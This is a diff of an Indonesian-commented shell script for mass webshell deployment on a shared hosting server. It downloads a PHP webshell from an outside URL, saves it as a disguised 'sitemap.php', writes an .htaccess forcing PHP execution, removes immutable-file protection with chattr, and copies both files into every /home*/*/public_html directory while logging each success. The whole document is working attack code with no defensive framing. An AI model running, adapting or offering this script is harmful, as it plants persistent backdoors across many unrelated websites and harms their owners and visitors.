@@ -1,17 +1,18 @@
-# 1. Download Webshell dari sumber kamu
-curl -s https://www.insomnie.guide/sitemap.php -o /root/sitemap.php
+# 1. Download webshell payload dari GitHub
+curl -s https://raw.githubusercontent.com/Hecate1337-py/controlkit/refs/heads/main/__sys.php -o /root/sitemap.php
 
-# 2. Buat .htaccess agar webserver tetap handle file PHP (tanpa blokir IP)
+# 2. Buat file .htaccess agar PHP tetap bisa dijalankan
 cat <<'EOF' > /root/htaccess_sitemap
 <FilesMatch "\.php$">
   SetHandler application/x-httpd-php
 </FilesMatch>
 EOF
 
-# 3. Buat script injector massal
+# 3. Buat script injeksi massal
 cat <<'EOF' > /root/inject_sitemap.sh
 #!/bin/bash
-LOGFILE="/root/injected_sitemap_$(date +%F_%H-%M).txt"
+
+LOGFILE="/root/injected_sitemap_$(date +%F_%H-%M).log"
 SHELL="/root/sitemap.php"
 HTACCESS="/root/htaccess_sitemap"
 
@@ -20,30 +21,34 @@ if [ ! -f "$SHELL" ]; then
   exit 1
 fi
 
-echo "[...] Memulai injeksi massal sitemap.php..."
+echo "=== Start Inject: $(date) ===" > "$LOGFILE"
 
 for path in /home*/*/public_html; do
   if [ -d "$path" ]; then
+    echo "[•] Injecting to $path"
+
     # Bypass proteksi immutable
     chattr -i "$path" 2>/dev/null
     chattr -i "$path/sitemap.php" 2>/dev/null
     chattr -i "$path/.htaccess" 2>/dev/null
 
-    # Inject file sitemap.php
-    cp "$SHELL" "$path/sitemap.php"
+    cp "$SHELL" "$path/sitemap.php" 2>/dev/null
+    cp "$HTACCESS" "$path/.htaccess" 2>/dev/null
 
-    # Inject .htaccess biasa
-    cp "$HTACCESS" "$path/.htaccess"
-
-    echo "[✓] Injected to $path/sitemap.php" | tee -a "$LOGFILE"
+    if [ -f "$path/sitemap.php" ]; then
+      echo "[✓] $path/sitemap.php" | tee -a "$LOGFILE"
+    else
+      echo "[✘] Gagal inject $path" | tee -a "$LOGFILE"
+    fi
   fi
 done
 
-echo "[✔] Selesai. Log: $LOGFILE"
+echo "=== Selesai: $(date) ===" >> "$LOGFILE"
+echo "[✔] Log saved to $LOGFILE"
 EOF
 
-# 4. Kasih izin eksekusi
+# 4. Jadikan executable
 chmod +x /root/inject_sitemap.sh
 
-# 5. Jalankan
+# 5. Jalankan injeksi massal
 bash /root/inject_sitemap.sh
